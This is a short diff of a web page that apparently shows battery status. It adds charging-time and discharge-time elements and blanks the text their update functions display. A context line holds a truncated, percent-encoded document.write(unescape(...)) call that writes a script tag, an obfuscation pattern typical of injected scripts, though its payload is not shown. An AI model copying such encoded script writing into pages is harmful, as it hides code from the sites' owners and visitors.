@@ -103,6 +103,8 @@ document.write(unescape('%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%
 <body translate="no">
 <div class="charging"></div>
 <div class="level"></div>
+<div class="charging-time"></div>
+<div class="discharge-time"></div>
 </center>
 	  </br>
 
@@ -351,13 +353,13 @@ function updateLevelInfo(level) {
 }
 
 function updateChargingInfo(chargingTime) {
-  let text = "Battery charging time: " + chargingTime + " seconds";
+  let text = "" + "";
 
   document.querySelector('.charging-time').textContent = text;
 }
 
 function updateDischargingInfo(dischargingTime) {
-  let text = "Battery discharging time: " + dischargingTime + " seconds";
+  let text = "" + "";
 
   document.querySelector('.discharge-time').textContent = text;
 }
